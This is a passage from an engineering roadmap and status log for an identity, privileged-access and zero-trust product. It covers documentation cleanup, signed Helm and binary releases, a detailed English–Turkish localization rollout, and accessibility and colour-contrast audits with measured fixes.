(SAML SLO actually notifies SPs, signed), and the post-audit A5 (SMS and
email OTP fail closed, OTP codes and OAuth authorization codes out of the
logs, the `SMS_PROVIDER`-typo mock fallback removed). What remains of P1
is the rollout itself — steps 1–6 above, run against the live deployment.

*Exit test:* for any user, **My Apps & Network, the assignment report, the
proxy, `/oauth/authorize` and the Ziti controller all give the same
answer** — display equals enforcement, one grant model, one login, one MFA
policy. This is the moment the IAM/PAM/ZTNA confusion structurally ends.

### P2 — Tell one product story (parallel with P1)

1. ✅ **The docs site tells the truth** — *shipped on this branch*:
   `docs/docs/index.md` and `guide/architecture.md` rewritten around the
   four pillars (Keycloak purged; 8 services; the security spine), a new
   published **Concepts** page carries the §1 mental model and glossary,
   and the nav gains **Privileged Access (PAM)** and **Zero Trust Network
   (ZTNA)** sections. The strong repo-level deep dives are linked from the
   published pages rather than duplicated; repo URLs in `mkdocs.yml`
   corrected. Site builds clean under `mkdocs --strict`.
   *Second sweep (with the chart publishing):* the remaining phantom
   surfaces on the site are gone — `charts.openidx.org` and the fake
   `openidx-linux-amd64.tar.gz` release asset replaced with the real
   OCI chart + per-service signed binaries; `github.com/openidx/...`
   **URLs** repointed at the real repo (Go **import paths** correctly
   keep the module path); the `make migrate-*`/`make seed` targets that
   don't exist replaced with the real `cmd/migrate`/`openidx seed`
   CLIs; the last Keycloak ghosts (env-var tables, compose service
   rows, an 8180 health check, a `keycloakAdminPassword` chart value)
   deleted; `deployment/kubernetes.md` now shows the 0.2.0 chart
   (migration hook, OPA fail-closed note, real template tree).
2. ✅ **Quickstart fixed and stale entry docs bannered** — *shipped on
   this branch*: the published quickstart drops Keycloak, states the
   authoritative first login and hardware floor; PROJECT-STATUS.md,
   FEATURE_PRIORITY_PLAN.md (whose old banner pointed at documents that
   never existed) and TESTING.md carry stale-history banners pointing at
   current docs. ✅ *Quickstart fold shipped:* the README Quick Start is
   the single supported first run; GETTING-STARTED.md is now explicitly
   the from-source developer guide and its diverging compose section
   (which skipped `generate-secrets.sh` and printed credentials that no
   longer exist) defers to the README; the production guide's section is
   scoped as "Production Quick Start" with a pointer back.
3. ✅ **PAM docs and API spec** — the published admin + end-user PAM guide
   shipped (`guide/privileged-access.md`), and `/pam/*` is now fully
   specced in `api/openapi/access-service.yaml`: all 66 registered
   operations (entries/vault, brokered launch, checkout controls,
   moderation, SSH CA + cloud JIT, privilege graph, Ziti reach, Windows
   apps), request/response schemas verified against the handlers, spec
   verified 1:1 against the `service.go` route table. *Still open
   (operator-side):* the `contractcheck -probe` live diff against a
   running deployment.
4. ✅ **Auditor artifacts shipped** — *on this branch*:
   [THREAT-MODEL.md](./THREAT-MODEL.md) (trust boundaries, per-component
   STRIDE with code evidence — overlay, broker, recordings, vault, audit
   chain — plus the residual-risk register R1–R8) and
   [COMPLIANCE-CONTROL-MAPPING.md](./COMPLIANCE-CONTROL-MAPPING.md)
   (SOC 2 CC-series + ISO 27001:2022 Annex A → capability → evidence,
   with honest Provided/Configurable/Shared/Operator statuses and the
   §5-checklists-as-evidence-generator workflow). Linked from SECURITY.md.
5. ✅ **Doc-tree separation shipped** — [docs/README.md](./README.md) is
   the documentation map: product docs (start-here, security/compliance,
   concepts, feature guides, runbooks) cleanly separated from
   engineering artifacts (plans, designs, audits, contributor
   references) with the rule stated ("read artifacts for the *why*;
   verify the *what* against code"), historical docs and the two
   Turkish-language docs labeled. Implemented as an index rather than
   mass file moves so no inbound link breaks.

*Exit test:* an evaluator who reads only the published site can describe
all four pillars, deploy, log in, and find PAM.

### P3 — Operability & release hygiene

1. ~~**Cut v1.28.0 now**~~ — **corrected 2026-09-04:** v1.28.0 through
   v1.33.3 were already cut when this was written (the audit clone had
   no tags, so `git describe` lied). What is open is the *hygiene* of
   those releases: `CHANGELOG.md` never advanced (359 already-shipped
   lines under `[Unreleased]`, this branch's work absent, compare links
   pinned at v1.17.0); `web/admin-console/package.json`, the chart's
   `appVersion`, `client/pubspec.yaml` and `PRODUCTION-READINESS.md`
   each pin a different version; and no cut release is signed (cosign
   exists only on this branch). Tracked as **P8**; the next tag is
   **v1.34.0**, the first signed one.
2. ✅ **Helm chart finished** — *on this branch* (chart `0.2.0`):
   migration Job as a post-install/pre-upgrade hook (new `tools` image
   built in CI: `cmd/migrate` + `cmd/backup`); a **real** OPA
   Deployment/Service behind `config.opaUrl` (policies via
   `opa.policyConfigMap`); the fake `apisix` toggle and the entire
   Keycloak dependency/values/env removed; opt-in ServiceMonitor
   (scrapes `/metrics` on all 8 services) and backup CronJob
   (PVC or S3, retention, encrypted via the chart key); the
   `networkPolicy` profile now admits migrate/backup→Postgres and
   services→OPA. Validated: `helm lint` clean, `helm template` parsed
   across default/all-on/external-secrets/networkPolicy combinations.
   ✅ **And published:** `release.yml` now packages the chart per tag
   (chart version = release version) and pushes it to
   `oci://ghcr.io/mhmtgngr/openidx/charts/openidx`, cosign-signed by
   digest with the same workflow-identity pin as the binaries
   (packaging + dependency build verified locally end-to-end); README,
   the site's installation/kubernetes pages and
   [RELEASING.md](./RELEASING.md) document install-from-registry and
   verification — replacing the site's phantom `charts.openidx.org`
   instructions.
3. ✅ **WebAuthn challenges moved to Redis with TTL** — shipped on this
   branch (`internal/identity/webauthn.go`); the in-memory map remains
   only as a single-replica fallback with lazy expiry.
4. ✅ **Release artifacts signed** — `release.yml` now generates
   `SHA256SUMS` over all eight binaries and signs it with keyless cosign
   (GitHub OIDC → Sigstore; `id-token: write`, no stored key); the
   release body and [RELEASING.md](./RELEASING.md) carry the
   `cosign verify-blob` + `sha256sum -c` verification recipe with the
   workflow-identity pin.
5. Dependabot/Renovate: ✅ **deduplicated** — `.github/dependabot.yml`
   (which duplicated all four ecosystems and used invalid options)
   deleted in favor of the richer Renovate config; phantom `openidx/*`
   team assignees/reviewers stripped from `renovate.json`. ✅ **Dead
   surfaces pruned** — `frontend/`, the Keycloak theme, orphaned
   `branding.tsx`, the 13 legacy SQL files (credential-seeding one
   included), and `landing.tsx`'s unsubstantiated claims (see §3.1-D).
   *Decided 2026-09-04:* Flutter ships; `mobile/` is deleted (P7).

### P4 — Enterprise reach (sequence by sales pressure)

1. ✅ **i18n framework landed** — *on this branch*: i18next/react-i18next
   in the admin console with English + Turkish catalogs, browser
   detection + persisted choice (`openidx.lang`), a `LanguageSwitcher`,
   and the landing page as the reference extraction. Locales are typed
   against the English catalog, so a missing translation fails
   `npm run type-check`; conventions in `web/admin-console/README.md`.
   *Extraction so far:* the landing page, the **entire login surface**
   (all four screens — credentials, MFA method selection, MFA verify
   incl. WebAuthn/push/OTP states, SSO options — plus every client-side
   error string; server `error_description` strings pass through
   untranslated by convention), and the **app chrome** (sidebar, view
   switcher, menu search, account menu, aria labels), with the switcher
   on the login screens and in the authenticated header. The login
   footer's Privacy/Terms/Help trio — link-styled text with no
   destinations — was replaced with real Documentation/Security links,
   pinned by test. *And the navigation layer:* all 97 menu items, 11
   section headings and 7 domain headings resolve through the catalogs
   (English stays canonical in `config/navigation.ts` and remains a
   search synonym), the sidebar quick-search and ⌘K command palette
   match **both** languages, breadcrumbs translate, and a
   completeness test pins that every key the nav config references
   exists in every declared language. *And the five most-seen end-user
   page bodies:* Dashboard (both personas — the admin overview with stat
   cards, alerts, activity feed incl. relative times, Ziti/PAM cards and
   analytics titles, and the personal landing), My Apps & Network, My
   Security, My Access, and Sessions (admin + "My Sessions" personas) are
   fully bilingual — headings, empty states, toasts, confirm dialogs,
   table headers, badges and placeholders — as is the shared `QueryError`
   component (401/403/load-failure sentences localize; pages pass a
   localized resource name). Server-sourced text (names, statuses, tips,
   API error messages) stays untranslated by convention, and keys wired
   through runtime maps are pinned by test since the `typeof en` check
   can't see them. *And the rest of the end-user surface:* My Devices
   (incl. the network-access setup flow and posture badges), Trusted
   Browsers, the Notification Center (tabs, digest settings, localized
   relative times), Access Requests (all three personas — requester,
   approver, admin — with the create/approve/deny/retrieve/return
   dialogs), and the full My Profile account page (personal info, TOTP/
   SMS/email-OTP enrollment flows, trusted browsers, password change
   incl. the AD/Azure-AD managed variants, sessions, personal access
   tokens, authorized apps) are fully bilingual, as are the shared
   compliance-score tooltips. **Every page a non-admin user can reach
   now renders in English and Türkçe end to end** — with the caveat 1k
   found and closed: "page" meant `src/pages`, and the components those
   pages compose were not in scope. *And the admin
   surface is under way:* the IAM identity core — Users, Groups, Roles
   and Bulk Operations, the pages an admin drives daily (CRUD dialogs,
   role/permission and membership management, CSV import/export,
   policy-violation surfacing, pagination) — is bilingual, with shared
   pagination/confirm strings promoted to the common catalog; and so is
   the rest of the Identity section plus the app registry: Applications
   (OAuth/OIDC registration, SSO settings, secret regeneration), the
   Directory Integrations page (the four-tab LDAP/AD/Azure AD connection
   dialog incl. its inline validation messages and the
   diagnose-and-auto-fix flow), Service Accounts (API-key lifecycle),
   and the Operations Cockpit (health tiles, posture/threat cards, PAM
   broker health). *And the whole federation/SSO section:* Identity
   Providers (quick-setup templates, OIDC/SAML registration), Social
   Login Providers, SAML Service Providers (registration + IdP-metadata
   download), Federation Configuration (all three tabs — federation
   rules, identity links, custom claims mapping) and Provisioning Rules
   (the trigger/operator/action vocabularies that drive automated
   provisioning). *And the IGA governance loop:* Access Reviews and the
   review-detail workbench (per-item and batch approve/revoke/flag),
   Certification Campaigns (schedules, runs, the auto-revoke
   confirmations that state what a run will actually do), Attestation
   Campaigns, the Entitlement Catalog and Approval Policies — so the
   pages an auditor and an approver work in are bilingual, including the
   consequential confirm dialogs. *And the MFA/authentication-security
   cluster:* MFA Management (enrollment overview, policies, per-user
   factor status), MFA Bypass Codes (the security notice, the generate
   and audit-log dialogs, the revoke confirmation), Passwordless
   Authentication (magic links, QR login, biometric-only, and the
   "how it works" explainers), Hardware Tokens (inventory, assignment,
   and the revoke/report-lost confirmations that name the serial),
   Security Keys and Push Devices (both factor counts pluralised
   natively) and Security Alerts (alert triage plus the IP blocklist and
   its unblock confirmation) — so the screens an operator uses to hand
   out, withdraw and audit login factors read correctly in either
   language. *And the risk/analytics cluster:* Risk-Based MFA Policies
   (the condition and action vocabularies, the priority-ordered policy
   list and the test-evaluation dialog), the Risk Dashboard, Login
   Anomalies (including the per-user baseline profile), Authentication
   Analytics and Login Analytics — with the shared period selector
   ("Last 7 Days" and friends) promoted to the common catalog. *And the
   first PAM cluster:* the credential Vault (secret list, versions, grants,
   checkouts and rotation runs, the reason-stamped reveal dialog and the
   crypto-erase confirmation), Rotation Policies (the eight connector
   vocabularies and every schema-driven connector field) and the
   Connections manager (the RDM-style entry tree, launch/reveal/request
   flows, the RDM import, and the "how does this connect" explainer whose
   whole launch chain — approval gate, credential source, broker, Ziti or
   direct reach, target — now reads in either language). *And the PAM
   session-brokering pages:* Privileged Sessions (pending requests, live
   Guacamole sessions with terminate and live-monitor, session history
   with the transcript download and the legal-hold place/release dialogs),
   Remote Support (the session table, the recording-retention editor, the
   start-session dialog with its transport choice, and both legal-hold
   confirmations) and Kiosk Policies (lockdown modes, the editor and the
   agent/tag assignment dialog) — so the screens where an operator
   watches, records, terminates and legally holds a privileged session
   read in either language. *And the publishing pair:* App Publish (the
   register/discover/classify/publish flow, the path table with its
   security-classification vocabulary, and the one-click publish dialog)
   and Windows Apps (the app catalog, host pools, agent-bound discovery,
   the launch-conflict resolver and the prominent warning about hosts that
   allow unlisted programs). *And the evidence pages an auditor actually
   reads:* Audit Logs (the date-range and event-type filters, the
   statistics strip and its two charts, the paginated event table and the
   full event-detail dialog), Admin Audit Log (the five-way filter bar,
   the expandable before/after state diff and the export-all-pages CSV
   flow), Compliance Reports (the framework picker, the scorecard, the
   control-findings list with its remediation notes) and Reports & Exports
   (report history, cron-scheduled reports and both dialogs). Two rules
   held here that are worth stating: the backend's `event_type` and
   framework vocabularies resolve *through* the catalog with a prettified
   raw fallback, so a value the server adds later still reads as itself
   rather than as a bare key; and the exported CSV's column names stay
   English on purpose — that file is a machine-readable schema, and
   localizing its header would break every consumer that parses it.
   *And the pages that decide who gets in:* Policies (the SoD / risk /
   timebound / location / conditional-access vocabulary, the stat row, the
   policy table with its enable-disable toggle, and the rule builder —
   whose condition rows now carry only the backend's field name, with both
   the label and the worked example resolved from it, so a new condition
   field cannot ship half-translated), ABAC Policies (the attribute and
   operator vocabularies, the condition builder, the delete confirmation
   that names the policy, and the evaluate-against-sample-attributes
   dialog with its ALLOWED/DENIED verdict), and Zero Trust Access (the
   resource spine with its access-method and control chips, the live
   sessions and recent-events tabs, and the coverage-gaps view that names
   exactly which of auth, device trust, posture and risk cap each resource
   is missing). *And the overlay setup pair:* Network Setup (the topology
   strip, the ordered setup checklist, the install advisor and the
   per-route data-path table) and BrowZer Bootstrapper Management (status
   and certificate cards, the certificate tab, and the domain-change flow
   with its cascading-updates warning). Network Setup is the clearest case
   of the convention that keeps this honest: almost all of its prose —
   every checklist step's title, description, remediation and action
   label, every component's role and install lines, every route's data
   path, requirements and warnings — is *composed by the backend* in
   `internal/access/ziti_setup_handlers.go`, so it stays untranslated;
   only the page's own chrome localizes. Translating server prose in the
   client would have produced a page that looks bilingual and silently
   disagrees with the API. *And the route editor those pages send you to:*
   Proxy Routes — the hosting-mode and route-type vocabularies, the route
   rows with their badges and detail grid, the quick-create BrowZer flow,
   the full create/edit form and the delete confirmation, plus the three
   components the page owns (the per-route feature panel, the inline
   OpenZiti/BrowZer switches, and the connection test with its per-probe
   results). Two details carried over: the connection test names each
   probe *through* the catalog with a prettified raw fallback, so a probe
   the backend adds later still reads as itself; and the form's sample
   placeholders (`admin, developer`, `192.168.1.100`, the policy DSL
   expression) stay raw, because a translated example would stop matching
   what the API accepts. *And the two configuration surfaces an operator
   touches first:* Settings — general, password policy, session and lockout,
   the advanced session policies, country-based access control,
   authentication, the SMS/OTP gateway and branding — and Consent
   Management, the privacy surface (user consents, data subject access
   requests, retention policies, impact assessments). The SMS provider
   registry is the clearest win of the pass: eleven gateways previously
   carried their own hardcoded field labels, so "API Key" appeared eight
   times in English; the registry now names a `labelKey` per field and each
   label is translated once, which also means a new gateway cannot ship with
   a translated name and English fields. Consent Management's status, risk
   and request-type vocabularies resolve through the catalog with a raw
   fallback, its badges became components so they re-resolve on a language
   switch, and one more `en-US`-pinned date now follows the browser locale.
   *And the day-to-day Ziti operations console:* the Ziti Network page —
   4,100 lines and by some margin the largest in the product — is now fully
   localized across all six of its tabs. Connection, overview and services;
   the identity roster with its enrolment JWTs and attribute sync; the nine
   sections of the Security tab (active sessions, configurations, auth
   policies, terminators, service policies, edge-router policies, posture
   checks, the per-identity posture viewer and certificates); the policy-sync
   panel; the Remote Access tab; and the temporary access-link manager that
   issues time-limited vendor URLs. Two conventions did the work here. The
   *explain service* dialog is composed entirely by the backend's explain
   endpoint — the summary and every hop's title, detail, fix and technical
   line — so it renders as sent, exactly as Network Setup does, with a
   comment saying why; only the dialog title and its loading state are client
   strings. And the controller's own vocabularies (posture check types,
   severities) resolve *through* the catalog with a raw fallback, with the
   select options driven off one constant so the badge and the form cannot
   drift apart. What stays raw is what would break if translated: protocol
   acronyms, and the sample values that teach a format (`10.0.0.5`,
   `admin@company.com`, attribute lists like `#engineering, #vpn-users`).
   *And the four largest pages that were left:* Notification Administration
   (routing rules, broadcasts, delivery stats), Access 360 (the page that
   correlates one user across all three pillars), the OAuth Playground and
   Lifecycle Workflows. This pass is where the "backend vocabulary resolves
   *through* the catalog" rule paid off four times over: delivery channels
   and broadcast statuses, agent compliance statuses, and the lifecycle
   service's event / trigger / action / execution vocabularies all resolve by
   key with a raw fallback, each driving its filter, its badge and its form
   select off one list so the three cannot drift apart. Two module-level maps
   that had frozen English at import time — `deviceSourceLabel` and
   `actionTypeLabels` — now return catalog keys resolved at render. And the
   OAuth Playground draws the other line: the protocol's own parameter names
   (`code_verifier`, `code_challenge`, `state`, `access_token`) and endpoint
   paths stay untranslated, because they are the wire identifiers a developer
   types, not prose. Access 360's English is pinned by its own page test, so
   every extracted value stayed byte-identical and that test passes unchanged.
   *And the operator's own diagnostic surfaces:* Delegated Administration,
   the API Explorer, Certificate Management and System Health. Three more
   module-level maps that had frozen English at import time now resolve at
   render — the delegation scope kinds and their per-kind "where do I find
   this UUID" hints, the API Explorer's service groups, and System Health's
   overall and per-dependency status configs, which now carry only styling
   and an icon. Two pages draw the raw/translated line explicitly: the API
   Explorer keeps HTTP methods, endpoint paths, OAuth scopes, parameter
   names and the cURL/JavaScript/Go/Python tab labels untranslated, because
   they are the request a developer actually sends; Certificate Management
   keeps endpoint URLs, ports, the `docker restart` line and every
   server-sourced certificate field raw, because an operator copies or
   matches those literally. Two more ungrammatical concatenations became real
   plurals ("safe fix(es) applied"), and the uptime formatter now takes the
   locale's own unit suffixes instead of hardcoding `d`/`h`/`m`.
   Batch 18 took the endpoint-agent surfaces — Developer Settings, Device
   Trust Approval, Agent Fleet and Ziti AI Insights. Three of the four hand
   an operator a button that cuts someone off the network, so the raw/
   translated line was drawn tightly: platform names (Linux, macOS, Windows,
   Android, iOS), the `device-trusted` Ziti role attribute, CORS origins and
   the controller's own HA/OIDC acronyms stay raw; so does every
   server-composed string — upgrade advisories, risk-signal names,
   recommendation titles and API error messages — because an operator matches
   those against the fabric, not against a translation. The overlay's wire
   vocabularies (agent lifecycle, posture compliance, anomaly types, the
   shared low/medium/high/critical severity scale, resolved subject kinds)
   now resolve through the catalog with a prettified raw fallback, so a value
   the backend adds later still reads as words rather than as a bare key.
   Two module-level label maps that froze English at import time became
   components that re-resolve on a language switch, and the Ziti analysis
   toast pluralizes both of its counts independently instead of concatenating
   "1 observations".
   Batch 19 took Usage Analytics, Webhooks, Tenant Management and the admin
   Devices inventory. Two of those four draw the raw/translated line at
   something other than a protocol identifier. Webhooks keeps its event names
   (`user.created`, `login.high_risk`) raw everywhere — picker, subscription
   card and delivery log — because they are what a subscriber matches on, not
   prose. And Tenant Management keeps the *tenant's own* branding copy raw:
   the login title, message and footer an operator types here are read by that
   tenant's end users, so the seeded defaults and the live preview render them
   exactly as stored rather than in whatever language the operator happens to
   be using; only the console chrome around them localizes. Four more derived
   or backend vocabularies now resolve through the catalog off one list —
   webhook subscription and delivery status, tenant domain kinds, the device
   type derived from the user agent and the overlay enrolment state — and two
   more concatenations became real plurals ("Total: 1 new user", "Showing 1 to
   1 of 1 device"), with the registration total keeping its locale-formatted
   number by passing the raw count for the plural rule and the formatted
   string for the sentence.
   Batch 20 took AI Agents, Ziti Discovery, Network Topology and Predictive
   Analytics. Two of those pages render the same vocabulary twice in different
   grammatical shapes — the agent's type and trust level appear lowercase on a
   row badge and title case in the create form; the topology's node kinds
   appear plural on the filter buttons and singular on the selected node's
   badge — so each shape gets its own catalog map, both keyed off one
   wire-value list, and both pinned by test: the *membership* cannot drift even
   though the casing legitimately differs. Where a sentence names a kind, the
   sentence itself is keyed by that kind rather than interpolating the word
   ("No service policies reference this identity."), so a locale that inflects
   the noun can write each variant out instead of gluing a nominative into a
   slot. Three more concatenations became real plurals — the Ziti bulk-import
   summary ("Imported 1 service. 0 failed."), its confirm button, and the
   login-forecast day counts — and the bulk-import confirmation moved onto
   `Trans` so the count stays bold. What stays raw: OAuth scopes, the
   credential key prefix, Ziti protocol names and host:port pairs, the
   URL-path example, the controller's policy names and types, and the
   forecaster's own peak-weekday string.
   Batch 21 took Organizations, Audit Archival, the Privacy Dashboard and the
   Unified Audit Log. The Privacy Dashboard is where the "one lookup" rule
   showed its value from the other direction: its DSAR status and request-type
   vocabularies already existed under `consentManagement` for the page it links
   to, so instead of copying them it now reads from there — one map, two pages,
   no way for the summary and the detail view to disagree. Its
   `getStatusBadge` helper became a component so the label re-resolves on a
   language switch, and one more `en-US`-pinned date now follows the browser
   locale. The retention sentence on Audit Archival is built from a plural and
   its own clause key ("Retain for 90 days (archive before delete)"), so each
   locale punctuates the parenthetical itself and the whole line lands in one
   text node instead of three siblings. What stays raw is what two pages would
   otherwise disagree about or what the UI itself matches on: the consent type
   (a free-form key Consent Management also renders raw), the unified feed's
   event type (the filter above the table matches the raw wire value, so a
   translated label would name something the filter cannot find), the three
   audit sources (product names), byte-size unit symbols, and the `org-slug`
   example that teaches the characters the field accepts.
   Batch 22 took the Compliance Posture dashboard, Lifecycle Policies,
   Identity Intelligence and the Identity Security Posture (ISPM) dashboard —
   the four screens that score the deployment and act on that score. Two of
   them put a number inside a sentence, and each does it the way its own
   locale needs: the compliance score's weight list keeps the weights in one
   const array on the page and interpolates them into a line the catalog owns,
   so Turkish can write `(%25)` where English writes `(25%)` and neither
   locale can mistype the number; ISPM's severity renders lowercase on a
   finding's own badge and title case in the Open Findings summary, so it gets
   the batch-20 two-map treatment off one wire list, with a test asserting the
   two casings name the same set. Lifecycle Policies replaced a module-level
   map that had frozen five policy-type labels at import time (and carried a
   per-type description nothing rendered) with one wire-value list the row
   badge and the create form both resolve through, and its "run this for real"
   confirmation now names the consequence through its own clause key, so a
   locale inflects "permanently deleted" with the sentence around it instead
   of receiving it as a dropped-in adjective. Identity Intelligence reuses the
   overlay's severity scale from `zitiAiInsights` rather than copying it — the
   two pages link to each other and score the same fusion — and draws the raw
   line where an operator matches text against the deployment: the briefing
   the local model narrates, each identity's reason strings, the model's own
   name, and the `AI_ENABLED=true` line typed verbatim into an environment
   file. ISPM's dismissal reason is likewise sent as written, because it is
   stored on the finding for whoever reads it next, not shown back to the
   operator who clicked. One latent bug surfaced on the way: the ISPM trend
   chart named its map variable `t`, which would have shadowed the translate
   function; it is now `point`.
   Batch 23 took AI Recommendations, Device Authorization, Email Templates and
   the Error Catalog. One of those four is not an admin screen at all: Device
   Authorization (RFC 8628) is the page a person opens on their phone after a
   TV app, CLI or kiosk shows them a code, so every sentence on it now
   localizes — including the two failure messages that deliberately read the
   same for "no such code" and "expired" so the page cannot be used to probe
   which codes exist, a property the Turkish wording keeps. It also had a
   latent English bug: when the remaining time rounded to zero the page said
   "Expires in about 1 minutes", because the clamp and the plural test
   disagreed; it is one plural key now, with a test. Two more `t`-shadowing
   traps were removed on the way — Email Templates named every template `t` —
   and its module-level category map, the error registry's categories and the
   recommendation engine's statuses and categories all moved onto one wire list
   apiece, each rendered in whichever casing its place needs. What stays raw is
   what a person matches or copies: each recommendation's title, description
   and engine-assigned type; every error code, HTTP status, description and
   resolution; the template's own subject and bodies and the `{{.Variable}}` Go
   template syntax its badges insert; the OAuth scopes a device asked for; and
   the sample code, sample URL and product name that teach a field's shape.
   Batch 24 took the Assignment Report, Quick Links administration, the PAM
   dashboard and the add-a-device wizard. The assignment report is the page
   that decides whether the P1 rollout is safe, and it was also the worst
   offender for hand-rolled English agreement: `user(s)`, `route{s}`, and
   inline `is`/`are`, `has`/`have`, `was`/`were` ternaries — nine of them in
   one card. Every one is now a real plural key. Two sentences there agree
   with *two different counts* at once; each composes a pluralized subject and
   pluralizes the rest around it ("2 of 6 users in this organization have no
   Ziti identity, so those users have no Ziti reach to lose and were not
   evaluated"), so a locale writes each form out rather than receiving a
   nominative dropped into a slot. Its fifteen existing tests, which pinned the
   English wording, pass unchanged. The other three are smaller: the quick-link
   category is stored as the operator typed it, so the form select and the row
   badge resolve one map keyed by the stored value with a raw fallback, while
   role names (the token's own vocabulary) and lucide icon ids stay raw; the
   PAM dashboard turns two more "N somethings in the last 30 days" lines into
   plurals; and the add-a-device wizard — an end-user screen — keeps the
   operating-system names, the enrolment code, its deep link and the QR that
   encodes it raw, with the "tap **Open in app**" sentence moved onto `Trans`
   so the bolded phrase survives translation.
   Batch 25 finished the surface: the pre-login flows (password reset,
   forgotten password, magic-link verification), notification preferences, the
   PAM session and remote-support pop-out windows, and the API-docs frame.
   Two of those carried the same defect the login card was fixed for in P4.1b
   — a Privacy / Terms / Help footer that was link-styled text with no
   destinations, naming pages this project does not have. Translating it would
   have shipped the same lie in a second language, so the login card's footer
   became a shared component (`components/auth-card-footer.tsx`) and both
   password pages now render the real Documentation and Security links.
   **Every page body under `src/pages` now resolves through the catalogs —
   0 remaining, and a test enumerates the directory and fails if a page ever
   ships without `useTranslation` again.**
   *Still open in P4:* the browser-based accessibility audit behind a VPAT
   (see the next item), the separate hardened end-user portal bundle, and the
   Expo-vs-Flutter mobile decision. The catalogs themselves keep growing with
   the product; the framework guarantees a missing translation fails
   `npm run type-check` rather than reaching a user.
1b. ✅ **The automatable half of accessibility is now a gate — and writing it
   found a real defect.** `src/test/a11y.test.tsx` runs axe-core over the
   thirteen surfaces a person outside the admin team reaches — every pre-login
   flow (login, forgotten password, reset, magic-link verify, device
   authorization) and every end-user page — and fails on any WCAG 2.1 A/AA
   violation it can detect. It went red the first time it ran: the
   notification-preferences page renders an event × channel grid of
   **fourteen toggles that were `<button>`s containing nothing but a
   decorative knob** — no text, no `aria-label`, no `role="switch"`, no
   `aria-checked`. On screen a toggle is identified by its row and column; a
   screen reader reads the control alone, so a person using one heard
   fourteen anonymous buttons and could not tell what any of them controlled
   or whether it was on. Each now carries `role="switch"`, `aria-checked`,
   and a label naming both axes (“Email notifications for: Security alerts”,
   translated in both catalogs), with the knob `aria-hidden`. Every other
   surface was already clean, and the gate keeps it that way.
   **What this is not:** a VPAT, or a claim that the console is accessible.
   The test says so in its own header — colour contrast cannot run there,
   because axe's contrast rule needs real paint and jsdom cannot provide it
   (the rule is explicitly disabled rather than left to throw, log and report
   nothing, which reads exactly like a pass); and keyboard order, focus
   management and screen-reader announcement are things axe does not test in
   any environment. The gate ships with a red-proof case — an unnamed button
   and an unlabelled input it must flag — per the same rule the repo's shell
   and Go checkers follow.
1c. ✅ **Colour contrast measured in a real browser — 23 WCAG AA failures
   found and fixed.** Rather than leave contrast as an unmeasured caveat, it
   was run: headless Chromium against the production build, axe's
   `color-contrast` rule, all five pre-login routes (landing, login, forgotten
   password, reset, magic-link verify) in **both** colour schemes. That found
   **23 real failures**, in three root causes rather than 23 unrelated ones:
   (a) the light theme's `--muted-foreground` was `#64748b`, which is
   **4.34:1** on the slate-100 surfaces this app puts muted text on — under
   AA's 4.5:1 — so secondary copy and every login-card footer link failed;
   it is now 42% lightness (`#5a687d`, 5.17:1 there and 5.66:1 on white) and
   still reads as muted. (b) The landing footer is `bg-gray-900
   text-muted-foreground`: a permanently dark surface borrowing the *light*
   theme's muted token, **3.73:1** — and darkening that token for light
   surfaces made this pairing worse, not better, so the footer now carries
   `text-slate-400` (6.92:1) of its own. (c) The auth pages' error boxes put
   `text-red-600` on `bg-red-50`, **4.41:1**, failing in both schemes because
   the pair is hardcoded; they use `text-red-700` (5.91:1) now. Scoped
   deliberately: `text-red-600` appears in 70 files but passes AA on white,
   so only the measured red-on-red-50 pairing changed rather than 70 files of
   unmeasured churn. Re-measured after the fix: **0 failures across all ten
   route × scheme combinations.** Still unmeasured at that point: contrast on
   the authenticated surfaces, and the whole keyboard/focus/screen-reader
   class. The first of those two is now closed — see 1d.

1d. ✅ **The authenticated surfaces measured too — the "needs a running
   backend" caveat was wrong.** 1c left contrast on the signed-in pages
   unmeasured on the grounds that they need a backend. They do not: the
   console's auth is entirely client-side (it parses a JWT from
   `localStorage` and checks `exp` and a non-empty `roles` claim — no
   signature check in the browser), so a well-formed unsigned token plus a
   path-aware Playwright route stub renders every one of them with no server
   at all. `web/admin-console/scripts/contrast-audit.mjs` does that over
   **36 routes × 2 colour schemes** — the 12 end-user surfaces and 24 admin
   pages. The stub returns *populated* data on purpose: an empty list renders
   an empty state, and an empty state has none of the badges, status pills
   and table rows contrast bugs live in. The first version of the probe
   returned 0 violations on every route and was **wrong** — the pages were
   rendering blank because one stub had the wrong shape. It now reports each
   route's character count and axe pass count and fails on a blank page, for
   exactly that reason. **27 real failures, six root causes:** (a) the view
   switcher's active pill paired the theme-flipping `bg-background` with a
   fixed `text-blue-700` — 2.99:1 on dark, on *every* page that shows it;
   (b) two light tints (`bg-blue-50/50` on unread notifications,
   `bg-green-50/30` on the My Devices network card) had no dark variant, so
   they composited to mid-grey over the dark background and took the muted
   text inside them to 1.56:1 — the audit dashboard already had the
   `dark:bg-*-950/20` pairing they were missing; (c) the security-score
   number was `text-yellow-600`, 2.94:1, under the 3:1 that 48px bold still
   needs; (d) the "expires soon" hint was `text-orange-600`, and no single
   orange clears AA in both themes (600 is 3.56 light, 700 is 3.86 dark), so
   it took a dark variant; (e) `--primary` as *text* on a `--muted` strip was
   3.98:1 in dark — raising the dark token from 59.8% to 64% lightness fixes
   that at 4.60:1 **and** improves the primary button, whose near-black label
   goes 4.85 → 5.61:1; (f) the device-code input set no colours of its own,
   so it kept the browser's default white box while its text came from the
   theme — **1.05:1 in dark mode, on the one screen a person opens on a phone
   because a television told them to.** Re-measured: **0 violations across
   all 72 route × scheme combinations, 0 blank pages.** Scope discipline
   again: a third `bg-blue-50/50` on the Ziti network page looked like the
   same bug and was left alone because measuring it showed it passing.

1e. ✅ **A token-level contrast guard that runs in CI, with no browser.**
   The browser audit needs a build and a preview server, so it is a
   pre-release tool, not a gate — and it can only judge what a route
   actually paints. `src/test/design-token-contrast.test.ts` closes both
   gaps for the token layer: it parses the HSL custom properties out of
   `index.css` and asserts the 14 foreground/surface pairs the components
   render, in both themes, at AA. It found a defect **no page sweep had
   reached**: light `--destructive-foreground` on `--destructive` was
   **3.59:1** — the label of every Delete / Revoke / Terminate button in the
   console, invisible to the sweep because those buttons live inside confirm
   dialogs. Dropping the token to 48% lightness gives 4.64:1 on the button
   and 4.86:1 for `text-destructive` on a card, same hue. The guard is
   red-proofed against the three real regressions it exists to catch (it
   reproduces 3.59:1, 3.97:1 and the previous increment's 4.34:1 exactly),
   and pins the contrast maths against black-on-white = 21:1.
1f. ✅ **The console no longer white-screens on a bad API response.** Found
   while building the contrast probe, not looked for: pointing the console at
   a backend that returns one wrong-shaped response (an object where a page
   maps an array) rendered a **completely blank page — zero characters** with
